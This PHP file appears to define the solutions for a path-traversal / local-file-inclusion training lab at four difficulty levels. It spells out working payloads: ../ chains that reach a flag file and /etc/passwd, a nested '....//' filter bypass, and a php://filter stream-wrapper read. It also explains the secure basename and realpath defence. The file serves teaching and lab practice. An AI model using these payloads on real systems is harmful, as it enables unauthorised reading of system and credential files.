<?php
$p = '/labs/lfi-docs/run?doc=';
return [
  'low' => [
    'goal' => "Walk out of the documents folder to an arbitrary file.",
    'steps' => [
      "The name is appended to the docs path with no checks.",
      "The docs folder is deep, so climb with six ../ segments: ../../../../../../opt/forge/flag.txt",
      "You can also read /etc/passwd the same way.",
    ],
    'why' => "The filename was trusted, so ../ sequences walk the path up and out of the intended directory to any file the web server can read.",
    'run' => [['method' => 'GET', 'path' => $p . rawurlencode('../../../../../../opt/forge/flag.txt')]],
  ],
  'medium' => [
    'goal' => "Defeat a single, non-recursive removal of ../.",
    'steps' => [
      "str_replace removes ../ once.",
      "Nest it: ....// becomes ../ after one removal. Chain six of them.",
      "Payload: ....//....//....//....//....//....//opt/forge/flag.txt",
    ],
    'why' => "Removing ../ once from ....// leaves exactly ../, so a single-pass filter reconstructs the traversal you need.",
    'run' => [['method' => 'GET', 'path' => $p . rawurlencode('....//....//....//....//....//....//opt/forge/flag.txt')]],
  ],
  'high' => [
    'goal' => "Read a file when ../ is fully removed, using a stream wrapper.",
    'steps' => [
      "../ is stripped repeatedly, so traversal with ../ is impossible.",
      "The viewer still honours wrappers; a php://filter with an absolute resource path contains no ../ at all.",
      "Payload: php://filter/resource=/opt/forge/flag.txt",
    ],
    'why' => "Blocking ../ does nothing about stream wrappers. php://filter reads an absolute path directly, so you reach the file without a single traversal sequence.",
    'run' => [['method' => 'GET', 'path' => $p . rawurlencode('php://filter/resource=/opt/forge/flag.txt')]],
  ],
  'secure' => [
    'goal' => "Confirm basename, allowlist, and realpath containment hold.",
    'steps' => [
      "The input is reduced to its basename, must end in .txt, and its realpath must stay inside the docs folder.",
      "Send the traversal payload and watch it be refused.",
    ],
    'why' => "basename discards any path, and the realpath check rejects anything resolving outside the documents directory, so neither traversal nor wrappers escape.",
    'run' => [['method' => 'GET', 'path' => $p . rawurlencode('../../../../../../opt/forge/flag.txt')]],
  ],
];
